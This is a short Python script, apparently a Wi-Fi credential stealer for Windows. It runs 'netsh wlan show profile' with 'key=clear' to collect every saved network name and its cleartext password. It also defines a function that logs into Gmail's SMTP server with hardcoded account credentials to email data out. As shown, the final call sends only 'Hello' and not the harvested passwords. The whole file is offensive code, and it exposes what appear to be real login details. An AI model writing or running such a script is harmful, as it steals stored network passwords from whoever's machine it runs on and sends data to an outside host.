#!usr/bin/env python

import subprocess, re, smtplib

all_networks_results = subprocess.check_output(["netsh", "wlan", "show", "profile"]).decode('utf-8')
network_names = re.findall(r"(?:Profile\s*:\s)(.*)", all_networks_results)
network_names = [i.strip() for i in network_names]

# Now we create a dictionary to hold the values of the network names and it corresponding password.

mywifi = []

# We then loop thru the network names to get the passwords.
try:
	for b in network_names:
		command = subprocess.check_output(["netsh", "wlan", "show", "profile", "name=", b, "key=clear"]).decode('utf-8')
		result = re.findall(r"(?:Key Content\s*:\s)(.*)", command)
		result = [i.strip() for i in result]
		result = (str(result)[1:-1])
		mywifi_dict = {"network": b, "password": result}
		mywifi.append(mywifi_dict)
except subprocess.CalledProcessError:
	print("None")

# A send mail function to send the data
def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()

send_mail("kay1.devil@gmail.com", "hackisnew12","Hello")